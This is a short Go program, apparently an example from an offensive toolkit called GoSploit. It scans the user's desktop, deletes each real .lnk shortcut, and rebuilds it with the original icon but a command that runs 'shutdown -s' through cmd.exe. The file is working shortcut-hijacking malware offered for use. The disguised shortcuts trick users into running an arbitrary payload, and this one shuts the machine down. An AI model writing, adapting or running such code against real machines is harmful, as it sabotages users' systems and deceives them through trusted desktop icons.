package main

import (
	"remplaceShortcut/GoExF/GoSploit"
	"remplaceShortcut/GoExF/GoSploit/EvilFile"
	"remplaceShortcut/GoExF/GoSploit/Recons"
	"log"
	"os"
	"strings"
)

func main() {
	GoSploit.Initialize()
	for _, v := range Recons.ListDir(GoSploit.Dekstop) {
		if strings.Contains(v, ".lnk") {

			lnk := EvilFile.EvilLnk{
				Name:        v,
				IconPath:    EvilFile.GetLnkInfo(GoSploit.Dekstop + "\\" + v).Target,
				Description: v,
				Interface:   "cmd.exe",
				Payload:     "shutdown -s",
				Path:        GoSploit.Dekstop + "\\",
			}
			err := os.Remove(GoSploit.Dekstop + "\\" + v)
			if err != nil {
				log.Fatal(err)
			}
			lnk.Build()
		}
	}

}
